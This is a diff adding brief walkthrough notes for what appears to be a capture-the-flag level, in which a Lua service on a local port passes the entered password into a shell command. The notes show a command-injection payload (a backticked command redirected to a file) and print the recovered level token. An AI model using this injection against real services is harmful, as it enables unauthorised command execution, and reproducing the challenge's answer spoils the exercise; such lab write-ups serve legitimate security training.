@@ -1,0 +1,12 @@
+# We have a level11.lua file, let's check it
+# We can see that it's connecting to a server which is 127.0.0.1 on port 5151
+# prog = io.popen("echo "..pass.." | sha1sum", "r") This line looks interesting
+# https://opensharing.fr/commandes-linux-sha1sum
+	netcat 127.0.0.1 5151
+# Then let's try to inject getflag command and put the result in a file we have the correct right access
+	cd /tmp
+	mkdir exploit
+	chmod 777 exploit
+# Type as password for the server the getflag command
+# `getflag` > /tmp/exploit/token
+# Token is : fa6v5ateaw21peobuub8ipe6s
